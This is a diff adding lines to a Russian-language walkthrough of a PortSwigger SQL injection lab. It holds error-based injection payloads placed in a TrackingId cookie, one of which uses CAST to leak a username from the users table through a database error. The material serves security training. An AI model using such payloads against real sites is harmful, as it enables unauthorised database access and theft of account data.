@@ -22,3 +22,14 @@ Cookie: TrackingId=smGr2plBdKc0Xtm8' AND CAST((SELECT 1) AS int)--
 ```
 
 ![PortSwigger](../Drawing/Drawing_30.png)
+
+---
+
+Для начала проверим, существует ли пользователь с учетными данными `administrator`:
+Запрос:
+
+```sql
+Cookie: TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
+```
+
+![PortSwigger](../Drawing/Drawing_31.png)
